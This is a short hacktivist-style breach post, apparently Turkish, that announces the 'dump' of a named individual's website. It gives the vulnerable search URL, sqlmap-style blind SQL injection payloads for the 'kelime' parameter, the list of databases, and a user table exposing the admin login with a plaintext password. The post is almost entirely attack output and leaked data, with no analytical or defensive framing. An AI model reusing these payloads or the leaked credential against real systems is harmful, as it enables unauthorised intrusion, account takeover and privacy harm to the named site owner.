ANTİ-KEMALİZM TARİKAT VE CEMAAT #OPSEC
Abdurrahman Dilipak Dumped

VULN URL : https://www.dilipak.com/ara.php?kelime=10

---
Parameter: kelime (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: kelime=10%' AND 1496=1496 AND 'GEYJ%'='GEYJ

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: kelime=10%' AND (SELECT 5578 FROM (SELECT(SLEEP(5)))GMad) AND 'tuFW%'='tuFW
---

available databases [2]:
[*] dilipak_data
[*] information_schema

Database: dilipak_data
Table: kullanici
[1 entry]
+----+-------+-------+----------------+
| id | kad   | email | sifre          |
+----+-------+-------+----------------+
| 1  | admin | admin | Dilipak987??!! |
+----+-------+-------+----------------+
